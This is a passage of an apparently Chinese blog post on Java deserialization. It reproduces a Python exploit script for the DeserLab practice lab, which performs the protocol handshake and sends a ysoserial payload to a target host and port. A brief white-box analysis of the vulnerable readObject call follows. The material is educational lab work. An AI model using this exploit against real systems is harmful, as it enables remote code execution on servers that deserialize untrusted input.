class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    DiabloHorn - https://diablohorn.com</span></span><br><span class="line"><span class="string">    References</span></span><br><span class="line"><span class="string">        https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/</span></span><br><span class="line"><span class="string">        https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html</span></span><br><span class="line"><span class="string">        https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html</span></span><br><span class="line"><span class="string">        http://gursevkalra.blogspot.nl/2016/01/ysoserial-commonscollections1-exploit.html</span></span><br><span class="line"><span class="string">        https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</span></span><br><span class="line"><span class="string">        https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478</span></span><br><span class="line"><span class="string">        https://www.youtube.com/watch?v=VviY3O-euVQ</span></span><br><span class="line"><span class="string">        http://wouter.coekaerts.be/2015/annotationinvocationhandler</span></span><br><span class="line"><span class="string">        http://www.baeldung.com/java-dynamic-proxies</span></span><br><span class="line"><span class="string">        https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy</span></span><br><span class="line"><span class="string">        https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">deser</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,tip,tport</span>):</span></span><br><span class="line">        self.targetip = tip</span><br><span class="line">        self.targetport = <span class="built_in">int</span>(tport)</span><br><span class="line">        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.s.connect((self.targetip, self.targetport))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">javaserial</span>(<span class="params">self</span>):</span></span><br><span class="line">        blob = <span class="string">&#x27;\xac\xed\x00\x05&#x27;</span></span><br><span class="line">        self.s.sendall(blob)</span><br><span class="line">        logging.debug(<span class="string">&quot;server javaserial resp: %s&quot;</span> % self.s.recv(<span class="number">4</span>).encode(<span class="string">&#x27;hex&#x27;</span>))    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">protohello</span>(<span class="params">self</span>):</span></span><br><span class="line">        header = self.s.recv(<span class="number">2</span>)</span><br><span class="line">        datalength = <span class="built_in">int</span>(struct.unpack(<span class="string">&#x27;B&#x27;</span>,header[<span class="number">1</span>])[<span class="number">0</span>])</span><br><span class="line">        logging.debug(<span class="string">&quot;server proto hello %s&quot;</span> % self.s.recv(datalength).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        blob = <span class="string">&#x27;\x77\x04&#x27;</span></span><br><span class="line">        blob2 = <span class="string">&#x27;\xf0\x00\xba\xaa&#x27;</span></span><br><span class="line">        self.s.sendall(blob)</span><br><span class="line">        self.s.sendall(blob2)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">protoversion</span>(<span class="params">self</span>):</span></span><br><span class="line">        header = self.s.recv(<span class="number">2</span>)</span><br><span class="line">        datalength = <span class="built_in">int</span>(struct.unpack(<span class="string">&#x27;B&#x27;</span>,header[<span class="number">1</span>])[<span class="number">0</span>])</span><br><span class="line">        logging.debug(<span class="string">&quot;server version %s&quot;</span> % self.s.recv(datalength).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        blob = <span class="string">&#x27;\x77\x02&#x27;</span></span><br><span class="line">        blob2 = <span class="string">&#x27;\x01\x01&#x27;</span></span><br><span class="line">        self.s.sendall(blob)</span><br><span class="line">        self.s.sendall(blob2)</span><br><span class="line">          </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clientname</span>(<span class="params">self</span>):</span></span><br><span class="line">        blob = <span class="string">&#x27;\x77\x09&#x27;</span> <span class="comment">#depends on username + type length</span></span><br><span class="line">        blob2 = <span class="string">&#x27;\x00\x07\x74\x65\x73\x74\x69\x6e\x67&#x27;</span></span><br><span class="line">        self.s.sendall(blob)</span><br><span class="line">        self.s.sendall(blob2)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">self, payload_file</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Normally this is where the HashRequest object is send</span></span><br><span class="line"><span class="string">            instead we send a ysoserial payload, skipping the first 4 bytes</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(payload_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> content_file:</span><br><span class="line">            payload = content_file.read()</span><br><span class="line">        self.s.sendall(payload[<span class="number">4</span>:])</span><br><span class="line">        logging.debug(<span class="string">&#x27;after exploit: %s&#x27;</span> % self.s.recv(<span class="number">1024</span>))</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Exploit for DeserLab&#x27;</span>,epilog=<span class="string">&#x27;https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;targetip&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target ip to exploit&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;targetport&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target port to exploit&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;payloadfile&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;file with the ysoserial payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    myargs = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    logging.debug(<span class="string">&quot;target %s&quot;</span> % myargs.targetip)</span><br><span class="line">    logging.debug(<span class="string">&quot;port %s&quot;</span> % myargs.targetport)</span><br><span class="line">    mydeser = deser(myargs.targetip, myargs.targetport)</span><br><span class="line">    logging.info(<span class="string">&quot;Connecting&quot;</span>)</span><br><span class="line">    mydeser.connect()</span><br><span class="line">    logging.info(<span class="string">&quot;java serialization handshake&quot;</span>)</span><br><span class="line">    mydeser.javaserial()</span><br><span class="line">    logging.info(<span class="string">&quot;protocol specific handshake&quot;</span>)</span><br><span class="line">    mydeser.protohello()</span><br><span class="line">    logging.info(<span class="string">&quot;protocol specific version handshake&quot;</span>)</span><br><span class="line">    mydeser.protoversion()</span><br><span class="line">    logging.info(<span class="string">&quot;sending name of connected client&quot;</span>)</span><br><span class="line">    mydeser.clientname()</span><br><span class="line">    logging.info(<span class="string">&quot;exploiting&quot;</span>)</span><br><span class="line">    mydeser.exploit(myargs.payloadfile)</span><br></pre></td></tr></table></figure>
+<p>然后执行<code>./deserlab.py ip port ./desrlab.bin</code>来进行利用。<br><img src="https://s2.loli.net/2022/03/18/ToP3qtRwdXBSkWj.png" alt="image.png"></p>
+<h2 id="白盒分析"><a href="#白盒分析" class="headerlink" title="白盒分析"></a>白盒分析</h2><p><img src="https://s2.loli.net/2022/03/19/mrGOwE7pn6QVdjz.png" alt="image.png"><br>图中的<code>readObject</code>便是漏洞的出现点，该方法会将输入流中的数据进行反序列化操作，然后强制转换为<code>HashRequest</code>类。<br><img src="https://s2.loli.net/2022/03/19/iBb9gU7IGjHDfKv.png" alt="image.png"><br>输入流是从socket所建立的网络连接中读取的，那么这个输入点就是我们用户可控的，也就可以在这个点测试反序列化漏洞。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html">入门介绍</a><br><a target="_blank" rel="noopener" href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/">DeserLab作者解释反序列化</a><br><a target="_blank" rel="noopener" href="https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/">手动构造DeserLab payload</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">sh@rp</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://sharpa.cn/2022/03/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://sharpa.cn/2022/03/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://sharpa.cn" target="_blank">知识茧房</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></div><div class="post_share"><div class="social-share" data-image="https://sm.ms/image/VZdNvELIAxOUY3o" data-sites="twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/03/11/CVE-DirtyPipe/"><img class="next-cover" src="https://tse3-mm.cn.bing.net/th/id/OIF-C.N3eFJMH36eFImY5P7oeSfg?pid=ImgDet&amp;rs=1" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CVE-DirtyPipe</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%9C%89%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">为什么会有序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9A%84%E7%B1%BB%E5%92%8C%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">相关的类和方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%BA%93%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.</span> <span class="toc-text">基础库中的反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8F%91%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞的发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞的利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%BC%94%E7%A4%BA"><span class="toc-number">3.</span> <span class="toc-text">实战演示</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">3.1.</span> <span class="toc-text">服务端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">3.2.</span> <span class="toc-text">客户端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="toc-number">3.3.</span> <span class="toc-text">黑盒测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E7%9B%92%E5%88%86%E6%9E%90"><span class="toc-number">3.4.</span> <span class="toc-text">白盒分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By sh@rp</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">build with love</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaidWrap.length) {
+    window.runMermaid = () => {
+      window.loadMermaid = true
+      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+      Array.from($mermaidWrap).forEach((item, index) => {
+        const mermaidSrc = item.firstElementChild
+        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+        const mermaidID = 'mermaid-' + index
+        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
+        })
+      })
+    }
+
+    const loadMermaid = () => {
+      window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+    }
+
+    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'WskQ6716WawpeVqRaU0LAwqR-gzGzoHsz',
+      appKey: '27h76RwyIhyB3XAO5S3RDPEQ',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://sharpa.cn/2022/03/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'
+    this.page.identifier = '2022/03/16/Java反序列化/'
+    this.page.title = 'Java反序列化'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
